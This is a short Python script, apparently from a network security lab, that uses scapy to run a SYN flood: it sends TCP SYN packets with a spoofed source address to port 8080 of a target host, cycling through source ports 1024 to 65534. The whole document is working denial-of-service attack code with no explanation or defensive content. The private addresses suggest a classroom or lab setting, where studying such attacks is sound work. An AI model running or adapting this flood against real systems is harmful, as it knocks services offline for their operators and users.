#!/bin/env python3
from scapy.all import *

print("SYN Flooding Starting")

def synFlooding(src, tgt):
   for sport in range(1024, 65535):
      L3 = IP(src=src, dst=tgt)
      L4 = TCP(sport=sport, dport=8080)
      pkt = L3/L4
      send(pkt)

src = "10.9.0.105"
tgt = "10.9.0.6"
synFlooding(src, tgt)
